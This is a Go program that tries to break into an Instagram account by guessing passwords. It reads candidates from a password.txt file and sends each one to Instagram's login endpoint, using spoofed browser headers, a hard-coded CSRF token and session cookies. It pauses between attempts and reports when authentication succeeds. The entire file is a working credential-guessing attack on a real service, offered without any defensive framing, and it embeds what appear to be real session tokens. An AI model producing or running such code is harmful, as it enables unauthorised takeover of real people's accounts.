package main

import (
    "bufio"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strings"
    "time"
)

func tryPassword(username, password string) bool {
    loginURL := "https://www.instagram.com/accounts/login/ajax/"
    data := url.Values{}
    data.Set("enc_password", "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
    data.Set("username", username)
    data.Set("optIntoOneTap", "false")
    data.Set("queryParams", "{}")
    data.Set("trustedDeviceRecords", "{}")
    data.Set("loginAttemptCount", "0")
    data.Set("isPrivacyPortalReq", "false")

    client := &http.Client{}
    req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
    if err != nil {
        fmt.Println("Error creating request:", err)
        return false
    }

    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
    req.Header.Set("X-CSRFToken", "z2y86ITZAahahOfRghvrCF3PlUj4wx8N")
    req.Header.Set("X-Instagram-AJAX", "1023134472")
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    req.Header.Set("Referer", "https://www.instagram.com/accounts/login/")
    req.Header.Set("Origin", "https://www.instagram.com")
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("X-IG-App-ID", "936619743392459")
    req.Header.Set("X-IG-WWW-Claim", "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC")
    req.Header.Set("Cookie", `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`)

    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending request:", err)
        return false
    }
    defer resp.Body.Close()

    bodyBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading response:", err)
        return false
    }
    body := string(bodyBytes)
        fmt.Println("Trying password:", password)
        fmt.Println("Response status:", resp.StatusCode)
        fmt.Println("Response body:", body)
//adeddd
    if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
        return true
    }
    return false
}

func main() {
    fmt.Print("Enter username: ")
    var username string
    fmt.Scanln(&username)

    file, err := os.Open("password.txt")
    if err != nil {
        fmt.Println("Error opening passwords file:", err)
        return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        password := scanner.Text()
        fmt.Println("Trying password:", password)
        if tryPassword(username, password) {
            fmt.Println("Password found:", password)
            break
        }
        time.Sleep(2 * time.Second)
    }

    if err := scanner.Err(); err != nil {
        fmt.Println("Error reading passwords file:", err)
    }
}
